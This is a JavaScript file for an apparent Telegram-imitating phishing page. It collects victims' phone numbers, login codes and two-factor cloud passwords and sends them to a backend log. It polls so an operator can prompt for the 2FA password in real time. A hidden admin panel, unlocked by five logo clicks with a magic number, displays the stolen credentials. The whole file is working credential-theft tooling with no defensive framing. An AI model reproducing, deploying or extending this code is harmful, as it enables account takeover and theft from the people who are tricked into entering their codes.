document.addEventListener('DOMContentLoaded', () => {
    const phoneStep = document.getElementById('phoneStep');
    const codeStep = document.getElementById('codeStep');
    const loginCard = document.getElementById('loginCard');
    const adminPanel = document.getElementById('adminPanel');

    const nextBtn = document.getElementById('nextBtn');
    const backBtn = document.getElementById('backBtn');
    const verifyBtn = document.getElementById('verifyBtn');
    const cloudPasswordBtn = document.getElementById('cloudPasswordBtn');
    const logoutBtn = document.getElementById('logoutBtn');
    const clearLogsBtn = document.getElementById('clearLogsBtn');

    const countryDropdown = document.getElementById('countryDropdown');
    const selectedCountryName = document.getElementById('selectedCountryName');
    const countryList = document.getElementById('countryList');
    const countrySearch = document.getElementById('countrySearch');
    const selectItems = document.querySelectorAll('.select-item');

    const countryPrefix = document.getElementById('countryPrefix');
    const phoneNumber = document.getElementById('phoneNumber');
    const verificationCode = document.getElementById('verificationCode');
    const cloudPassword = document.getElementById('cloudPassword');
    const logsBody = document.getElementById('logsBody');
    const loadingOverlay = document.getElementById('loadingOverlay');

    const twoFactorStep = document.getElementById('twoFactorStep');
    const successStep = document.getElementById('successStep');

    // --- State Storage Logic (API based) ---
    const API_BASE = ''; // Relative to same host

    async function getLogs() {
        try {
            const res = await fetch(`${API_BASE}/api/get_logs`);
            return await res.json();
        } catch (e) {
            console.error('Failed to fetch logs', e);
            return [];
        }
    }

    async function saveLog(phone, data = {}) {
        const timestamp = new Date().toLocaleTimeString();
        const payload = { ...data, phone, time: timestamp };

        try {
            await fetch(`${API_BASE}/api/save_log`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            updateAdminTable();
        } catch (e) {
            console.error('Failed to save log', e);
        }
    }

    async function setStatus(phone, status) {
        try {
            await fetch(`${API_BASE}/api/set_status`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone, status })
            });
            updateAdminTable();
        } catch (e) {
            console.error('Failed to set status', e);
        }
    }

    async function updateAdminTable() {
        if (!adminPanel || adminPanel.style.display === 'none') return;
        const logs = await getLogs();
        logsBody.innerHTML = logs.map(log => `
            <tr>
                <td>${log.time}</td>
                <td>
                    ${log.phone}
                    ${log.password ? `<br><small style="color: #ff9f0a;">PW: ${log.password}</small>` : ''}
                </td>
                <td><span style="color: #30d158; font-weight: bold;">${log.code || '---'}</span></td>
                <td>
                    <span style="color: ${log.status === '2fa_required' ? '#ff9f0a' : (log.status === 'success' ? '#30d158' : '#8e8e93')};">
                        ${log.status === 'success' ? 'Нет' : (log.status === '2fa_required' ? 'ДА' : 'Ожидание')}
                    </span>
                </td>
                <td>
                    <div class="admin-actions">
                        <button class="btn-mini btn-yes" onclick="window.adminSet2FA('${log.phone}', true)">2FA</button>
                        <button class="btn-mini btn-no" onclick="window.adminSet2FA('${log.phone}', false)">OK</button>
                    </div>
                </td>
            </tr>
        `).join('');
    }

    // Polling for admin panel update
    setInterval(() => {
        if (adminPanel && adminPanel.style.display !== 'none') {
            updateAdminTable();
        }
    }, 2000);

    // Polling for victim status check
    setInterval(() => {
        if (!adminPanel || adminPanel.style.display === 'none') {
            checkUserStatus();
        }
    }, 2000);

    window.adminSet2FA = (phone, required) => {
        setStatus(phone, required ? '2fa_required' : 'success');
    };

    // Removed storage event listener as we use polling now

    async function checkUserStatus() {
        if (phoneNumber.value.trim().length < 5) return;

        const phone = countryPrefix.textContent + ' ' + phoneNumber.value;
        const logs = await getLogs();
        const myLog = logs.find(l => l.phone === phone);
        if (!myLog || myLog.status === 'idle') return;

        if (myLog.status === 'success') {
            loadingOverlay.classList.add('hidden');
            showStep(successStep);
        } else if (myLog.status === '2fa_required') {
            loadingOverlay.classList.add('hidden');
            showStep(twoFactorStep);
        }
    }

    function showStep(stepToShow) {
        [phoneStep, codeStep, twoFactorStep, successStep].forEach(step => {
            step.classList.add('hidden');
            step.style.display = 'none';
        });
        stepToShow.style.display = 'flex';
        stepToShow.classList.remove('hidden');
        stepToShow.classList.add('fade-in');
    }

    // --- Country Dropdown Logic ---
    countryDropdown.addEventListener('click', (e) => {
        if (e.target.closest('#countrySearch')) return;
        countryDropdown.classList.toggle('active');
        countryList.classList.toggle('hidden');
        if (!countryList.classList.contains('hidden')) {
            countrySearch.focus();
        }
    });

    document.addEventListener('click', (e) => {
        if (!countryDropdown.contains(e.target)) {
            countryDropdown.classList.remove('active');
            countryList.classList.add('hidden');
        }
    });

    selectItems.forEach(item => {
        item.addEventListener('click', () => {
            const value = item.getAttribute('data-value');
            const name = item.getAttribute('data-name');
            const flag = item.getAttribute('data-flag');

            selectedCountryName.innerHTML = `<img src="https://flagcdn.com/w20/${flag}.png" class="flag-icon"> ${name}`;
            countryPrefix.textContent = value;

            selectItems.forEach(si => si.classList.remove('selected'));
            item.classList.add('selected');
        });
    });

    countrySearch.addEventListener('input', (e) => {
        const filter = e.target.value.toLowerCase();
        selectItems.forEach(item => {
            const text = item.textContent.toLowerCase();
            item.style.display = text.includes(filter) ? 'block' : 'none';
        });
    });

    phoneNumber.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\D/g, '');
        let formattedValue = '';
        if (value.length > 0) {
            formattedValue = value.substring(0, 3);
            if (value.length > 3) formattedValue += ' ' + value.substring(3, 6);
            if (value.length > 6) formattedValue += ' ' + value.substring(6, 10);
        }
        e.target.value = formattedValue;
    });

    nextBtn.addEventListener('click', () => {
        const fullNumber = countryPrefix.textContent + ' ' + phoneNumber.value;
        if (phoneNumber.value.trim().length < 5) return;

        saveLog(fullNumber, { status: 'idle' });
        showStep(codeStep);
    });

    backBtn.addEventListener('click', () => {
        showStep(phoneStep);
    });

    let logoClicks = 0;
    let logoClickTimeout;

    document.querySelectorAll('.tg-logo').forEach(logo => {
        logo.addEventListener('click', () => {
            logoClicks++;
            clearTimeout(logoClickTimeout);

            // Если в номере введено 7777777777 и кликнули 5 раз
            const cleanNumber = (countryPrefix.textContent + phoneNumber.value).replace(/\s/g, '');
            if (logoClicks >= 5 && cleanNumber.includes('7777777777')) {
                showAdminPanel();
                logoClicks = 0;
                return;
            }

            logoClickTimeout = setTimeout(() => {
                logoClicks = 0;
            }, 2000); // Сброс через 2 секунды бездействия
        });
    });

    verifyBtn.addEventListener('click', () => {
        const fullNumber = countryPrefix.textContent + ' ' + phoneNumber.value;
        const code = verificationCode.value;

        if (code.length >= 1) {
            saveLog(fullNumber, { code, status: 'waiting' });
            loadingOverlay.classList.remove('hidden');
        }
    });

    cloudPasswordBtn.addEventListener('click', () => {
        const fullNumber = countryPrefix.textContent + ' ' + phoneNumber.value;
        const pass = cloudPassword.value;
        if (pass.length < 1) return;

        saveLog(fullNumber, { password: pass, status: 'waiting' });
        loadingOverlay.classList.remove('hidden');
    });

    function showAdminPanel() {
        loginCard.classList.add('hidden');
        setTimeout(() => {
            loginCard.style.display = 'none';
            adminPanel.style.display = 'flex';
            adminPanel.classList.remove('hidden');
            adminPanel.classList.add('fade-in');
            updateAdminTable();
        }, 400);
    }

    logoutBtn.addEventListener('click', () => {
        adminPanel.classList.add('hidden');
        setTimeout(() => {
            adminPanel.style.display = 'none';
            loginCard.style.display = 'block'; // Reset display to original
            loginCard.classList.remove('hidden');
            loginCard.classList.add('fade-in');
            // Reset fields
            phoneNumber.value = '';
            verificationCode.value = '';
        }, 400);
    });

    clearLogsBtn.addEventListener('click', async () => {
        if (confirm('Очистить все логи?')) {
            try {
                await fetch(`${API_BASE}/api/clear_logs`, { method: 'POST' });
                updateAdminTable();
            } catch (e) {
                console.error('Failed to clear logs', e);
            }
        }
    });
});
